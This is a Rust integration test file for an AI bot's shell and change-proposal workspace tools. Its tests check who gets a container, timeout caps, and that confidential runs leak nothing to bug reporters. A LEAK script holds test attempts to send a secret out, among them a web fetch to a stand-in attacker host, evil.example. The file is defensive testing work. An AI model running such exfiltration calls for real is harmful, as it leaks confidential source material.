//! `clax.shell.exec` and `clax.change.propose` through a real run:
//! what reaches the workspace, what a replayed step does, who gets a
//! container, and that a run's end ends it.

use crate::common::*;
use clax_bot::workspace::{
    CODE_CHANGE_REFUSED, CODE_CONFIDENTIAL, CODE_SHELL_DISABLED, CODE_SHELL_INTERRUPTED,
    CODE_SHELL_UNAVAILABLE, FIX_PROPOSED, FakeWorkspace, MAX_TIMEOUT_SECS, Offer,
    PROPOSAL_STRANDED, PROPOSAL_WITHHELD, PreviewSink, Proposal, REPLY_KEPT,
};
use clax_bot::{Deps, Next, Workspace};
use clax_bot_sandbox::HostError;
use clax_core::audit::AuditCtx;
use clax_core::queue::{Report, ReportersSee};
use clax_core::report::FixOutcome;
use clax_store::bot_runs::{DriverId, Run, RunStatus, StepKind, WokenBy};
use clax_store::queues::{ExternalScope, NewQueue, NewReport, ReporterToken, Visibility};
use clax_store::roles::OWNER;
use serde_json::{Value, json};
use std::sync::{Arc, Mutex};
use std::time::Duration;

pub(crate) fn with(env: &Env, w: Arc<dyn Workspace>) -> Deps {
    env.deps().with_workspace(w)
}

pub(crate) fn script_value(env: &Env, run: &str) -> Value {
    let (_, steps) = env.store.run_with_steps(run).unwrap().unwrap();
    let s = steps.iter().find(|s| s.kind == StepKind::Script).unwrap();
    let p = s.payload.as_ref().unwrap();
    serde_json::from_str(p["result"]["content"].as_str().unwrap()).unwrap()
}

#[tokio::test]
async fn a_command_runs_in_the_workspace_and_a_finished_run_ends_it() {
    let env = Env::new().await;
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"const a = await clax.shell.exec("uname -a");
           const b = await clax.change.propose({title: "t", summary: "s"});
           return [a.exit_code, b.pr];"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    let out = env
        .drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Finished));
    assert_eq!(script_value(&env, &run)["value"], json!([0, 1]));
    let c = w.calls.lock().unwrap();
    assert_eq!(c.commands, ["uname -a"]);
    assert_eq!(c.proposals.len(), 1);
    assert_eq!(c.finished, [run]);
}

#[tokio::test]
async fn a_host_with_no_workspace_refuses_and_declares_nothing() {
    let env = Env::new().await;
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"try { await clax.shell.exec("ls"); return "ran"; } catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    env.drive(&env.deps(), &run, &DriverId::mint()).await;
    assert_eq!(
        script_value(&env, &run)["value"],
        json!(CODE_SHELL_DISABLED)
    );
    let first = &env.api.requests()[0];
    assert!(!first.body.to_string().contains("ephemeral Linux container"));
}

/// Offers a shell and nothing more, and keeps what it was given.
#[derive(Default)]
struct ShellOnly {
    timeouts: Mutex<Vec<u64>>,
    /// How far each command moves the clock.
    spends: Mutex<Option<(Arc<clax_core::working::ManualClock>, i64)>>,
}

#[async_trait::async_trait]
impl Workspace for ShellOnly {
    fn offer(&self, _run: &Run, _queue: Option<&str>) -> Offer {
        Offer::SHELL
    }
    async fn exec(
        &self,
        _run: &Run,
        _queue: Option<&str>,
        _command: &str,
        _cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.timeouts.lock().unwrap().push(timeout_secs);
        if let Some((clock, secs)) = &*self.spends.lock().unwrap() {
            clock.advance(*secs);
        }
        Ok(json!({"exit_code": 0, "output": ""}))
    }
    async fn propose(&self, _run: &Run, _p: &Proposal) -> Result<Value, HostError> {
        panic!("a shell alone may not propose");
    }
    async fn finish(&self, _run: &Run) {}
}

#[tokio::test]
async fn a_shell_alone_may_not_propose_and_a_timeout_is_bounded() {
    let env = Env::new().await;
    let w = Arc::new(ShellOnly::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"await clax.shell.exec("sleep 1", {timeout: 999999});
           try { await clax.change.propose({title: "t", summary: "s"}); return "proposed"; }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(
        script_value(&env, &run)["value"],
        json!(CODE_SHELL_DISABLED)
    );
    assert_eq!(*w.timeouts.lock().unwrap(), [MAX_TIMEOUT_SECS]);
}

#[tokio::test]
async fn a_person_outside_a_reports_queue_gets_no_container() {
    let (value, commands) = ls_on_a_report(Some("someone-else")).await;
    assert_eq!(value, json!(CODE_SHELL_DISABLED));
    assert!(commands.is_empty());
}

#[tokio::test]
async fn the_owner_of_a_reports_queue_gets_a_container() {
    let (value, commands) = ls_on_a_report(None).await;
    assert_eq!(value, json!("ran"));
    assert_eq!(commands, ["ls"]);
}

/// `ls` in a run for the owner on a report of a queue `maker` made (`None`:
/// the owner): what the script returned, and the commands the workspace saw.
async fn ls_on_a_report(maker: Option<&str>) -> (Value, Vec<String>) {
    let env = Env::new().await;
    let (_, report) = filed(&env, maker);
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"try { await clax.shell.exec("ls"); return "ran"; } catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    let commands = w.calls.lock().unwrap().commands.clone();
    (script_value(&env, &run)["value"].clone(), commands)
}

#[tokio::test]
async fn neither_a_reporter_nor_a_service_grant_is_offered_anything_on_a_report() {
    // Neither can start a run; were one named as a run's person, it has no
    // role in the queue and is no connected person.
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let deps = with(&env, Arc::new(FakeWorkspace::default()));
    for who in [REPORTER, "g1", "u_0123456789abcdef012345"] {
        let run = env.run_for(who, &report.artifact.id, &report.id);
        assert_eq!(
            deps.workspace_offer(&env.run_row(&run)),
            Offer::default(),
            "{who}"
        );
    }
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    assert_eq!(deps.workspace_offer(&env.run_row(&run)), Offer::CHANGE);
}

const REPORTER: &str = "reporter-1";

/// A report filed by [`REPORTER`] on a queue `maker` made (`None`: the
/// owner): its queue's ID and the report.
pub(crate) fn filed(env: &Env, maker: Option<&str>) -> (String, Report) {
    let ctx = AuditCtx::DAEMON;
    let q = env
        .store
        .create_queue(
            &ctx,
            maker,
            NewQueue {
                name: "App".into(),
                origins: vec!["https://app.example".into()],
                reporters_see: ReportersSee::Own,
            },
        )
        .unwrap();
    let token = ReporterToken {
        queue_id: q.id.clone(),
        service_grant_id: "g1".into(),
        reporter_id: REPORTER.into(),
        origin: "https://app.example".into(),
        public_key: String::new(),
        expires_at: "2099-01-01T00:00:00.000Z".into(),
        profile: None,
    };
    let report = env
        .store
        .file_report(
            &ctx,
            &q.id,
            Some(&token),
            ExternalScope::Instance,
            NewReport {
                external_id: None,
                url: "https://app.example/".into(),
                title: "App".into(),
                anchor: serde_json::from_value(json!({"kind": "element", "selector": "#a"}))
                    .unwrap(),
                body: "It is broken".into(),
                author_name: REPORTER.into(),
                metadata: json!({}),
                revision: None,
                clip: None,
                context: None,
                server: None,
                diagnostics: None,
            },
        )
        .unwrap();
    (q.id, report)
}

/// All [`REPORTER`] can read of report `tid`, as a reporter's route serves it.
pub(crate) fn as_reporter(env: &Env, qid: &str, tid: &str) -> Report {
    env.store
        .report(qid, tid, Visibility::Reporter(REPORTER))
        .unwrap()
        .unwrap()
        .for_reporter()
}

const SECRET: &str = "SECRET-SOURCE-LINE";

/// Every way a run writes text, each carrying [`SECRET`], and what each
/// answered, by name.
const LEAK: &str = r#"
    const s = "SECRET-SOURCE-LINE";
    const out = {};
    const attempt = async (name, f) => {
        try { out[name] = await f(); } catch (e) { out[name] = e.code; }
    };
    await attempt("reply", () => clax.threads.reply(THREAD, s));
    await attempt("publish", () => clax.draft.publish({note: s}));
    await attempt("set", () => clax.db.set("c", "d", {s}));
    await attempt("update", () => clax.db.update("c", "d", {s}, {if_version: 1}));
    await attempt("delete", () => clax.db.delete("c", "d", {if_version: 1}));
    await attempt("search", () => clax.web.search(s));
    await attempt("fetch", () => clax.web.fetch("https://evil.example/?q=" + s));
    await attempt("create", () => clax.artifacts.create({title: s}));
    await attempt("file", () => clax.files.write(s + ".html", s));
    await attempt("propose", () => clax.change.propose({title: s, summary: s}));
    return out;
"#;

#[tokio::test]
async fn a_confidential_run_can_write_nothing_a_reporter_reads_but_fixed_words_and_a_link() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::offering(
        Offer::CHANGE.confidential().reviewed_previews(),
    ));
    let leak = LEAK.replace("THREAD", &format!("{:?}", report.id));
    env.api.push(script_turn("tu_1", "Leak", &leak));
    env.api.push(finish_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let out = env
        .drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(out.last().unwrap().next, Next::Done(RunStatus::Finished));

    let saw = as_reporter(&env, &qid, &report.id);
    let all = serde_json::to_string(&saw).unwrap();
    assert!(!all.contains(SECRET), "{all}");
    let bodies: Vec<&str> = saw.comments.iter().map(|c| c.body.as_str()).collect();
    assert_eq!(bodies, ["It is broken", FIX_PROPOSED]);
    let fix = &saw.fixes[0].fix;
    assert_eq!(fix.summary, FIX_PROPOSED);
    assert_eq!(fix.url, None);
    assert_eq!(fix.commit, None);
    assert_eq!(
        fix.verify_url.as_deref(),
        Some("https://pr-1.preview.example")
    );

    // Each call that carries text elsewhere was refused before it left.
    let v = &script_value(&env, &run)["value"];
    for op in [
        "publish", "set", "update", "delete", "search", "fetch", "create",
    ] {
        assert_eq!(v[op], json!(CODE_CONFIDENTIAL), "{op}: {v}");
    }
    assert_eq!(v["reply"]["members_only"], true, "{v}");
    // The pull request keeps what the model wrote: it goes to the repository.
    assert_eq!(w.calls.lock().unwrap().proposals[0].summary, SECRET);
    // The queue's members read it on the report, and no one else does.
    let member = env
        .store
        .report(&qid, &report.id, Visibility::All)
        .unwrap()
        .unwrap();
    let notes: Vec<&str> = member
        .comments
        .iter()
        .filter(|c| c.triage_only)
        .map(|c| c.body.as_str())
        .collect();
    // The reply, and the fix's note; a run that replied posts no summary.
    assert_eq!(
        notes.iter().filter(|b| b.contains(SECRET)).count(),
        2,
        "{notes:?}"
    );
    let thread = env.store.get_thread(&report.id).unwrap().unwrap();
    assert!(thread.comments.iter().all(|c| !c.body.contains(SECRET)));
}

#[tokio::test]
async fn a_preview_no_person_approved_goes_to_the_queues_members_alone() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::offering(Offer::CHANGE.confidential()));
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "s"});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    let all = serde_json::to_string(&saw).unwrap();
    assert!(!all.contains("preview.example"), "{all}");
    assert_eq!(saw.fixes[0].fix.summary, FIX_PROPOSED);
    assert_eq!(saw.fixes[0].fix.verify_url, None);
    assert!(saw.fixes[0].held);
    // Held: to its reporter no fix waits, and neither verdict is taken.
    let by = clax_store::queues::Verdict::Reporter(REPORTER);
    let e = env
        .store
        .verify_report(&AuditCtx::DAEMON, &qid, &report.id, by, None, None);
    assert!(
        matches!(e, Err(clax_core::CoreError::NotFixProposed)),
        "{e:?}"
    );
    let by = clax_store::queues::Verdict::Reporter(REPORTER);
    let e = env.store.reopen_report(
        &AuditCtx::DAEMON,
        &qid,
        &report.id,
        by,
        "x".into(),
        None,
        None,
        None,
    );
    assert!(
        matches!(e, Err(clax_core::CoreError::NotFixProposed)),
        "{e:?}"
    );
    assert_eq!(
        env.store
            .reporter_badge(&qid, REPORTER)
            .unwrap()
            .report_ids
            .len(),
        1
    );
    let member = env
        .store
        .report(&qid, &report.id, Visibility::All)
        .unwrap()
        .unwrap();
    assert!(
        member
            .comments
            .iter()
            .any(|c| c.triage_only && c.body.contains("https://pr-1.preview.example")),
        "{:?}",
        member.comments
    );
}

/// A workspace whose offer a test changes.
struct Offers {
    inner: FakeWorkspace,
    offer: Mutex<Offer>,
    /// Whether its target cannot say it is private, whatever its offer.
    unread: bool,
}

impl Offers {
    fn of(offer: Offer) -> Arc<Offers> {
        Arc::new(Offers {
            inner: FakeWorkspace::default(),
            offer: Mutex::new(offer),
            unread: false,
        })
    }
}

#[async_trait::async_trait]
impl Workspace for Offers {
    fn offer(&self, _run: &Run, _queue: Option<&str>) -> Offer {
        self.offer.lock().unwrap().clone()
    }
    fn target_private(&self, _run: &Run, _queue: Option<&str>) -> bool {
        !self.unread && self.offer.lock().unwrap().confidential
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
}

const LS_THEN_FINISH: &str = r#"await clax.shell.exec("cat private.txt"); return 1;"#;

/// A report filed on a public target, a person's note for the queue's members
/// on it, and a run that tries to propose.
async fn proposing_past_a_members_note(offer: Offer) -> (Env, Arc<Offers>, String) {
    proposing_with_a_note_on(Offers::of(offer)).await
}

async fn proposing_with_a_note_on(w: Arc<Offers>) -> (Env, Arc<Offers>, String) {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    note(&env, &report.id, clax_core::model::AUTHOR_VIEWER);
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"try { return await clax.change.propose({title: "t", summary: "s"}); }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    (env, w, run)
}

#[tokio::test]
async fn a_run_holding_the_queues_notes_proposes_nothing_on_a_public_target() {
    let (env, w, run) = proposing_past_a_members_note(Offer::CHANGE).await;
    assert_eq!(script_value(&env, &run)["value"], CODE_CONFIDENTIAL);
    assert!(w.inner.calls.lock().unwrap().proposals.is_empty());
    assert!(env.run_row(&run).confidential);
    assert_eq!(env.host.lock().member_notes, [PROPOSAL_WITHHELD]);
}

#[tokio::test]
async fn a_target_that_cannot_say_it_is_private_is_taken_as_public() {
    let w = Arc::new(Offers {
        inner: FakeWorkspace::default(),
        offer: Mutex::new(Offer::CHANGE.confidential()),
        unread: true,
    });
    let (env, w, run) = proposing_with_a_note_on(w).await;
    assert_eq!(script_value(&env, &run)["value"], CODE_CONFIDENTIAL);
    assert!(w.inner.calls.lock().unwrap().proposals.is_empty());
}

#[tokio::test]
async fn a_run_holding_the_queues_notes_still_proposes_on_a_private_target() {
    let (env, w, run) = proposing_past_a_members_note(Offer::CHANGE.confidential()).await;
    assert_eq!(w.inner.calls.lock().unwrap().proposals.len(), 1);
    assert_ne!(script_value(&env, &run)["value"], CODE_CONFIDENTIAL);
}

#[tokio::test]
async fn confidentiality_is_kept_on_the_run_and_a_public_offer_never_clears_it() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE.confidential());
    env.api.push(script_turn("tu_1", "Read", LS_THEN_FINISH));
    env.api.push(finish_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w.clone());
    let d = DriverId::mint();
    env.tick(&deps, &run, &d).await;
    assert!(env.run_row(&run).confidential);
    *w.offer.lock().unwrap() = Offer::CHANGE;
    env.drive(&deps, &run, &d).await;
    assert!(env.run_row(&run).confidential);
    assert_eq!(as_reporter(&env, &qid, &report.id).comments.len(), 1);
}

#[tokio::test]
async fn a_confidential_run_resumed_on_a_host_with_no_workspace_stays_confidential() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE.confidential());
    env.api.push(script_turn("tu_1", "Read", LS_THEN_FINISH));
    env.api.push(finish_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let d = DriverId::mint();
    env.tick(&with(&env, w), &run, &d).await;
    env.drive(&env.deps(), &run, &d).await;
    let all = serde_json::to_string(&as_reporter(&env, &qid, &report.id)).unwrap();
    assert!(!all.contains(SECRET), "{all}");
}

#[tokio::test]
async fn a_run_that_touched_a_workspace_is_confidential_once_its_target_is_gone() {
    // Never said to be confidential: but the target that could say is gone.
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE);
    env.api.push(script_turn("tu_1", "Read", LS_THEN_FINISH));
    env.api.push(finish_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w.clone());
    let d = DriverId::mint();
    env.tick(&deps, &run, &d).await;
    env.tick(&deps, &run, &d).await;
    assert!(!env.run_row(&run).confidential);
    *w.offer.lock().unwrap() = Offer::default();
    env.drive(&deps, &run, &d).await;
    assert!(env.run_row(&run).confidential);
    let all = serde_json::to_string(&as_reporter(&env, &qid, &report.id)).unwrap();
    assert!(!all.contains(SECRET), "{all}");
}

#[tokio::test]
async fn a_run_that_never_touched_a_workspace_is_not_made_confidential_by_its_absence() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let row = env.run_row(&run);
    assert!(!env.deps().confidential(&row).unwrap());
    let deps = with(&env, Offers::of(Offer::default()));
    assert!(!deps.confidential(&row).unwrap());
    assert!(!env.run_row(&run).confidential);
}

#[tokio::test]
async fn a_store_error_is_confidential_for_the_tick_and_not_kept_for_a_run_that_touched_nothing() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, Offers::of(Offer::CHANGE));
    let row = env.run_row(&run);
    assert!(!deps.confidential(&row).unwrap());
    let c = rusqlite::Connection::open(env.home_db()).unwrap();
    c.execute_batch("ALTER TABLE threads RENAME TO threads_away")
        .unwrap();
    assert!(deps.confidential(&row).unwrap());
    assert!(!env.run_row(&run).confidential);
    c.execute_batch("ALTER TABLE threads_away RENAME TO threads")
        .unwrap();
    assert!(!deps.confidential(&row).unwrap());
}

#[tokio::test]
async fn a_store_error_is_kept_for_a_run_that_touched_a_workspace() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE);
    env.api.push(script_turn("tu_1", "Read", LS_THEN_FINISH));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w);
    let d = DriverId::mint();
    env.tick(&deps, &run, &d).await;
    env.tick(&deps, &run, &d).await;
    let c = rusqlite::Connection::open(env.home_db()).unwrap();
    c.execute_batch("ALTER TABLE threads RENAME TO threads_away")
        .unwrap();
    assert!(deps.confidential(&env.run_row(&run)).unwrap());
    assert!(env.run_row(&run).confidential);
}

#[tokio::test]
async fn a_run_whose_thread_is_deleted_holds_what_it_touched() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Offers::of(Offer::CHANGE);
    let idle = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.api.push(script_turn("tu_1", "Read", LS_THEN_FINISH));
    let used = env.run_for(OWNER, &report.artifact.id, &report.id);
    let deps = with(&env, w);
    let d = DriverId::mint();
    env.tick(&deps, &used, &d).await;
    env.tick(&deps, &used, &d).await;
    let c = rusqlite::Connection::open(env.home_db()).unwrap();
    c.execute_batch(&format!(
        "PRAGMA foreign_keys = OFF; DELETE FROM comments; DELETE FROM threads WHERE id = '{}'",
        report.id
    ))
    .unwrap();
    assert!(!deps.confidential(&env.run_row(&idle)).unwrap());
    assert!(deps.confidential(&env.run_row(&used)).unwrap());
}

#[tokio::test]
async fn a_confidential_mark_that_cannot_be_kept_fails_the_tick() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    let row = env.run_row(&run);
    let deps = with(&env, Offers::of(Offer::CHANGE.confidential()));
    let c = rusqlite::Connection::open(env.home_db()).unwrap();
    c.execute_batch(
        "CREATE TRIGGER no_mark BEFORE UPDATE OF confidential ON bot_runs
         BEGIN SELECT RAISE(ABORT, 'no'); END",
    )
    .unwrap();
    assert!(deps.confidential(&row).is_err());
    assert!(
        env.try_tick(&deps, &run, &DriverId::mint(), None)
            .await
            .is_err()
    );
}

#[tokio::test]
async fn a_confidential_runs_sources_stay_with_its_queue() {
    // It fetched while public; the sources list its end posts is a note.
    let env = Env::new().await;
    let url = "https://docs.example/SECRET-SOURCE-LINE";
    env.web.page(url, crate::web::page_at(url, "Docs", &[]));
    let w = Offers::of(Offer::SHELL);
    let code = format!(r#"await clax.web.fetch({url:?}); return 1;"#);
    env.api.push(script_turn("tu_1", "Read", &code));
    env.api.push(finish_turn("Read it."));
    let run = env.run_with_web("fetch");
    env.host.lock().context.threads[0].comments[0].text = url.to_string();
    let deps = with(&env, w.clone());
    let d = DriverId::mint();
    env.tick(&deps, &run, &d).await;
    env.tick(&deps, &run, &d).await;
    *w.offer.lock().unwrap() = Offer::SHELL.confidential();
    env.drive(&deps, &run, &d).await;
    let fetched = script_value(&env, &run);
    assert!(!env.store.web_pages(&run).unwrap().is_empty(), "{fetched}");
    let t = env.store.get_thread(&env.t1).unwrap().unwrap();
    assert!(t.comments.iter().all(|c| !c.body.contains(SECRET)), "{t:?}");
}

#[tokio::test]
async fn a_workspace_call_past_the_runs_time_is_refused_and_a_timeout_stops_at_it() {
    let env = Env::new().await;
    let w = Arc::new(ShellOnly::default());
    let minutes = i64::from(env.settings.0.lock().unwrap().max_run_minutes);
    env.api.push(env.script_turn(
        "tu_1",
        "Shell",
        r#"await clax.shell.exec("first", {timeout: 600});
           try { await clax.shell.exec("second"); return "ran"; }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run();
    // 100 seconds are left when the script runs, and the first command
    // takes them all.
    env.clock.advance(minutes * 60 - 100);
    *w.spends.lock().unwrap() = Some((env.clock.clone(), 100));
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(script_value(&env, &run)["value"], json!("run_cap"));
    assert_eq!(*w.timeouts.lock().unwrap(), [100]);
}

#[tokio::test]
async fn a_refused_fix_pushes_nothing() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    env.host.lock().fail_next.insert(
        "check_fix".into(),
        HostError::new("thread_taken", "another agent holds this report"),
    );
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"try { return await clax.change.propose({title: "t", summary: "s"}); }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(script_value(&env, &run)["value"], json!("thread_taken"));
    assert!(w.calls.lock().unwrap().proposals.is_empty());
}

#[tokio::test]
async fn a_fix_that_cannot_be_recorded_keeps_its_pull_request_in_sight() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    env.host
        .lock()
        .fail_next
        .insert("record_fix".into(), HostError::new("internal", "no"));
    env.api.push(script_turn(
        "tu_1",
        "Fix",
        r#"return await clax.change.propose({title: "t", summary: "s"});"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let v = script_value(&env, &run)["value"].clone();
    assert_eq!(v["url"], "https://forge.example/pr/1", "{v}");
    assert_eq!(v["fix_recorded"], false, "{v}");
    let people = env
        .store
        .report(&qid, &report.id, Visibility::All)
        .unwrap()
        .unwrap();
    assert!(
        people
            .comments
            .iter()
            .any(|c| c.body.contains("https://forge.example/pr/1")),
        "{:?}",
        people.comments
    );
}

#[tokio::test]
async fn a_run_woken_by_a_reply_may_answer_and_may_not_propose() {
    let env = Env::new().await;
    let (_, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(script_turn(
        "tu_1",
        "Answer",
        r#"await clax.shell.exec("cat fix.txt");
           try { await clax.change.propose({title: "t", summary: "s"}); return "proposed"; }
           catch (e) { return e.code; }"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.woken_run(WokenBy::Reply, &report.artifact.id, &report.id);
    env.drive(&with(&env, w.clone()), &run, &DriverId::mint())
        .await;
    assert_eq!(
        script_value(&env, &run)["value"],
        json!(CODE_SHELL_DISABLED)
    );
    assert!(w.calls.lock().unwrap().proposals.is_empty());
    let first = env.api.requests()[0].body.to_string();
    assert!(!first.contains("propose(change"), "{first}");
    assert!(first.contains("may not change"), "{first}");
}

#[tokio::test]
async fn a_second_proposal_supersedes_a_fix_still_waiting() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    env.api.push(script_turn(
        "tu_1",
        "Fix twice",
        r#"await clax.change.propose({title: "t", summary: "one"});
           await clax.change.propose({title: "t", summary: "two"});
           return 1;"#,
    ));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.fixes.len(), 2, "{:?}", saw.fixes);
    assert_eq!(saw.fixes[0].outcome, FixOutcome::Superseded);
    assert_eq!(saw.fixes[1].outcome, FixOutcome::Pending);
}

/// Keeps what a starting driver reaps with.
#[derive(Default)]
struct Reaps {
    inner: FakeWorkspace,
    active: Mutex<Vec<Vec<String>>>,
}

#[async_trait::async_trait]
impl Workspace for Reaps {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner.offer(run, queue)
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        self.inner
            .exec(run, queue, command, cwd, timeout_secs)
            .await
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.inner.propose(run, p).await
    }
    async fn finish(&self, run: &Run) {
        self.inner.finish(run).await;
    }
    async fn reap(&self, active: &[String]) {
        self.active.lock().unwrap().push(active.to_vec());
    }
}

#[tokio::test]
async fn a_starting_driver_hands_the_workspace_the_runs_that_may_go_on() {
    let env = Env::new().await;
    let w = Arc::new(Reaps::default());
    env.api
        .push(env.script_turn("tu_1", "Shell", r#"await clax.shell.exec("ls"); return 1;"#));
    env.api.push(finish_turn("done"));
    let ended = env.run();
    // It ends, and the crash comes before its container is ended.
    let mut crashed = with(&env, w.clone());
    crate::resume::crash_once(
        &mut crashed,
        clax_bot::run::CrashPoint::AfterCommit {
            step: 4,
            kind: StepKind::Finish,
        },
    );
    env.drive(&crashed, &ended, &DriverId::mint()).await;
    assert!(env.run_row(&ended).status.is_terminal());
    assert!(w.inner.calls.lock().unwrap().finished.is_empty());
    let waiting = env.run();
    let driver = clax_bot::Driver::new(
        DriverId::mint(),
        Arc::new(with(&env, w.clone())),
        env.hub.clone(),
    );
    driver.start(true).await.unwrap();
    assert_eq!(*w.active.lock().unwrap(), [vec![waiting]]);
}

#[tokio::test]
async fn a_confidential_run_that_gives_up_tells_a_reporter_nothing() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::offering(Offer::CHANGE.confidential()));
    // Its notice names what it gave up for and the files it edited.
    env.api.push(script_turn(
        "tu_1",
        "Edit",
        r#"await clax.files.write("SECRET-SOURCE-LINE.html", "x"); return 1;"#,
    ));
    env.api.push(give_up_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.comments.len(), 1, "{:?}", saw.comments);
}

#[tokio::test]
async fn a_run_outside_the_queue_of_a_confidential_target_stays_members_only() {
    // It gets no shell, yet the target's material is the same.
    let env = Env::new().await;
    let (qid, report) = filed(&env, Some("someone-else"));
    let w = Arc::new(FakeWorkspace::offering(Offer::CHANGE.confidential()));
    let code = format!(
        "return await clax.threads.reply({:?}, {SECRET:?});",
        report.id
    );
    env.api.push(script_turn("tu_1", "Reply", &code));
    env.api.push(finish_turn(SECRET));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.comments.len(), 1, "{:?}", saw.comments);
}

#[tokio::test]
async fn a_public_targets_run_still_talks_to_its_reporter() {
    let env = Env::new().await;
    let (qid, report) = filed(&env, None);
    let w = Arc::new(FakeWorkspace::default());
    let code = format!(
        r#"await clax.threads.reply({:?}, "On it.");
           return await clax.change.propose({{title: "t", summary: "Fixed the total."}});"#,
        report.id
    );
    env.api.push(script_turn("tu_1", "Fix", &code));
    env.api.push(finish_turn("done"));
    let run = env.run_for(OWNER, &report.artifact.id, &report.id);
    env.drive(&with(&env, w), &run, &DriverId::mint()).await;
    let saw = as_reporter(&env, &qid, &report.id);
    assert_eq!(saw.fixes[0].fix.summary, FIX_PROPOSED);
    assert_eq!(saw.fixes[0].fix.url, None);
